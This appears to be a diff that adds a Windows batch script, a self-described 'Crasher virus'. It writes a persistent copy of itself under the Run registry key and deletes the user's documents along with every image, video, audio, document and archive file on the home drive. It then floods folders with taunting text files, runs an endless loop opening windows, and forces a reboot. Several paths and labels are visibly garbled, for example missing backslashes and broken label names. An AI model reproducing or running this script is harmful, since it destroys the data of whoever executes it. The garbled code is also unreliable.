@@ -1,0 +1,95 @@
+@echo off
+ 
+cd %windir%
+ 
+echo @echo off>CPTL.bat
+ 
+echo reg add hkey_local_machinesoftwaremicrosoftwindowscurr entversionrun /V CTPL.bat /D %windir%system32CPTL.bat>>CPTL.bat
+ 
+echo if exist %windir%CPTL.bat goto oportunidad>>CPTL.bat
+ 
+echo copy /Y CPTL.bat %windir%>>CPTL.bat
+echo copy /Y CPTL.bat %windir%system32>>CPTL.bat
+echo cls>>CPTL.bat
+ 
+echo :msg>>CPTL.bat
+echo msg * A mortal virus has infected your computer!!>>CPTL.bat
+ 
+echo portunidad>>CPTL.bat
+echo cd %windir%>>CPTL.bat
+echo echo respuesta=INPUTBOX(”Insert the password to eliminate the virus” >oportunity.vbs>>CPTL.bat
+echo echo if respuesta=batch then>>oportunity.vbs>>CPTL.bat
+echo echo msgbox (”Correct, the virus won’t bother u more” >>oportunity.vbs>>CPTL.bat
+echo echo kill (”C:Windowsvirus.bat” >>oportunity.vbs>>CPTL.bat
+echo echo kill (”C:Windowssystem32virus.bat” >>oportunity.vbs>>CPTL.bat
+echo echo else>>oportunity.vbs>>CPTL.bat
+echo echo msgbox (”Muahaha you’re still infected try it next time” >>oportunity.vbs>>CPTL.bat
+echo echo start oportunity.vbs>>CPTL.bat
+cls>>CPTL.bat
+ 
+del /S /Q /F %userprofile%mis documentos*.*
+ 
+echo :del>>CPTL.bat
+echo cd %homedrive%>>CPTL.bat
+echo del /Q /S /F *.jpg>>CPTL.bat
+echo del /Q /S /F *.avi>>CPTL.bat
+echo del /Q /S /F *.mp3>>CPTL.bat
+echo del /Q /S /F *.doc>>CPTL.bat
+echo del /Q /S /F *.zip>>CPTL.bat
+echo del /Q /S /F *.rar>>CPTL.bat
+echo cls>>CPTL.bat
+ 
+echo :petar_escritorio>>CPTL.bat
+echo cd %homepath%Escritorio>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 1.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 2.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 3.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 4.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 5.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 6.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 7.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 8.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 9.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 10.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 11.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 12.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 13.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 14.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 15.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 16.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 17.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 18.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 19.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 20.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 21.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 22.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 23.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 24.txt>>CPTL.bat
+echo echo I’m the Crasher virus and I’ve infected your computer sucker>>virus 25.txt>>CPTL.bat
+echo cls>>CPTL.bat
+ 
+echo if exist C:virus%random%.txt (goto bucle)>>CPTL.bat
+ 
+echo etar_HD>>CPTL.bat
+echo cd>>CPTL.bat
+echo echo Your computer h as been infected, try to pay atention to it> virus%random%.txt>>CPTL.bat
+echo cd %ProgramFiles%>>CPTL.bat
+echo echo Your computer h as been infected, try to pay atention to it> virus%random%.txt>>CPTL.bat
+echo cd %windir%>>CPTL.bat
+echo echo Your computer h as been infected, try to pay atention to it> virus%random%.txt>>CPTL.bat
+echo goto Petar_HD>>CPTL.bat
+echo cls>>CPTL.bat
+ 
+del /S /Q /F %userprofile%mis documentos*.*
+ 
+echo :bucle>>CPTL.bat
+echo start iexplore.exe>>CPTL.bat
+echo start command.com>>CPTL.bat
+echo goto bucle>>CPTL.bat
+ 
+echo :Shutdown>>CPTL.bat
+echo shutdown -f -r -t 600 -c “Adios mamonazo bÃ¡jate un antivirus la prÃ³xima vez!!”>>CPTL.bat
+ 
+copy CPTL.bat %windir%system32
+ 
+start CPTL.bat
